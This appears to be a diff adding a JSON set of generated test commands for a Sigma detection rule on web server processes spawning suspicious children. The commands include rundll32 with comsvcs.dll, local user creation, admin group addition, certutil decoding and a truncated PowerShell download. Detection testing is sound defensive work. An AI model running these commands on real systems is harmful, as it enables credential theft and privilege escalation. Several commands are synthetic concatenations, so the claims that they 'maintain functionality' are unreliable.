@@ -1,0 +1,39 @@
+[
+  {
+    "output": "caddy.exe -someflag rundll32.exe comsvcs.dll",
+    "explanation": "This command simulates a web server process (caddy.exe) spawning a suspicious child process (rundll32.exe with comsvcs.dll), which matches the Sigma rule's detection criteria. The command uses minimal mutation techniques (insertion of flag) to maintain functionality while testing detection."
+  },
+  {
+    "output": "nginx.exe --option rundll32.exe comsvcs.dll",
+    "explanation": "This command simulates a web server process (nginx.exe) spawning a suspicious child process (rundll32.exe with comsvcs.dll), which matches the Sigma rule's detection criteria. The command uses substitution (long option) to maintain functionality while testing detection."
+  },
+  {
+    "output": "w3wp.exe rundll32.exe comsvcs.dll",
+    "explanation": "This command simulates a web server process (w3wp.exe) spawning a suspicious child process (rundll32.exe with comsvcs.dll), which matches the Sigma rule's detection criteria. The command uses omission (no additional flags) to maintain functionality while testing detection."
+  },
+  {
+    "output": "java.exe -Dcatalina.home=C:\\tomcat -tomcat rundll32.exe comsvcs.dll",
+    "explanation": "This command simulates a Java-based web server process (java.exe with Tomcat characteristics) spawning a suspicious child process (rundll32.exe with comsvcs.dll), which matches the Sigma rule's detection criteria. The command uses recoding (environment variable-like syntax) to maintain functionality while testing detection."
+  },
+  {
+    "output": "javaw.exe -Dcatalina.home=C:\\tomcat -tomcat rundll32.exe comsvcs.dll",
+    "explanation": "This command simulates a Java-based web server process (javaw.exe with Tomcat characteristics) spawning a suspicious child process (rundll32.exe with comsvcs.dll), which matches the Sigma rule's detection criteria. The command uses recoding (environment variable-like syntax) to maintain functionality while testing detection."
+  },
+  {
+    "output": "php-cgi.exe -f rundll32.exe comsvcs.dll",
+    "explanation": "This command simulates a web server process (php-cgi.exe) spawning a suspicious child process (rundll32.exe with comsvcs.dll), which matches the Sigma rule's detection criteria. The command uses substitution (flag syntax) to maintain functionality while testing detection."
+  },
+  {
+    "output": "net user testuser /add",
+    "explanation": "This command simulates a suspicious child process (net user /add), which matches the Sigma rule's detection criteria. The command uses omission (no additional flags) to maintain functionality while testing detection."
+  },
+  {
+    "output": "net localgroup administrators testuser /add",
+    "explanation": "This command simulates a suspicious child process (net localgroup administrators /add), which matches the Sigma rule's detection criteria. The command uses omission (no additional flags) to maintain functionality while testing detection."
+  },
+  {
+    "output": "certutil.exe -decode input.txt output.txt",
+    "explanation": "This command simulates a suspicious child process (certutil.exe with -decode), which matches the Sigma rule's detection criteria. The command uses substitution (flag syntax) to maintain functionality while testing detection."
+  },
+  {
+    "output": "powershell.exe -NoP -Command \"Invoke-WebRequest -Uri '
